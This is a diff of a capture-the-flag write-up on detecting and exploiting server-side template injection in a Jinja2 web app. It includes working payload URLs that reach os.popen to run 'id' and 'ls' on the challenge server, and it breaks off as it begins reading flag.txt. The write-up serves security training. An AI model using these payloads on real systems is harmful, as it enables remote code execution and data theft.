@@ -7,21 +7,29 @@ http://chall.seccomp.xyz:5003/
 
 ## Walkthrough
 Going to the challenge home page, it shows only a link (Jarvis). This link displays the following text: “Hi, Javis”. Note that the url accepts the parameter “name” and the default input is “Javis”.
+
 ![alt text](img/Picture1.png)
 ![alt text](img/Picture2.png)
 
 The output appears to be printed from a template. This template is as follows:
 “Hi, {name}”, where the variable “name” is the url input. 
 To verify, we can inject our own input.
+
 ![alt text](img/Picture3.png)
+
+
 
 Our input is displayed successfully. A vulnerability called Server Side Template Injection (SSTI) could be present in this web app. SSTI is a critical vulnerability as it enables the attacker to inject malicious inputs into a template and execute server side. Potential threats include unauthorised file disclosure and arbitrary code execution. The challenge title also gives a hint that it is SSTI (**S**uper **S**pace **T**ech **I**nc).
 
 A simple test to detect SSTI is to perform a mathematical evaluation and verify if the input is rendered and reflected in the output. Inserting the input “{{7*7}}” into the url parameter prints the output of 49, confirming the existence of SSTI.
 ![alt text](img/Picture4.png)
 
+
+
 In order to use the correct payload, we will need to identify the template engine. By injecting an invalid payload, an error will trigger and the engine is identified. However if the error messages are suppressed, we will need to inject language-specific payloads. Fortunately, PortSwigger has a decision tree for us to refer to: https://portswigger.net/research/server-side-template-injection
 ![alt text](img/Picture5.png)
+
+
 
 In this challenge, all of these are unnecessary as the description states it is running a python web server (Jinja2).
 
@@ -33,17 +41,23 @@ We will use the following payload to execute the “id” command via Remote Cod
 ```
 ![alt text](img/Picture6.png)
 
+
+
 The command is executed successfully.
 ```
 http://chall.seccomp.xyz:5003/read?name={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()%20}}
 ```
 ![alt text](img/Picture7.png)
 
+
+
 List files in the directory using “ls” command.
 ```
 http://chall.seccomp.xyz:5003/read?name={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27ls%27).read()%20}}
 ```
 ![alt text](img/Picture8.png)
+
+
 
 The flag.txt is discovered in the directory. Obtain the flag using “cat” command.
 ```
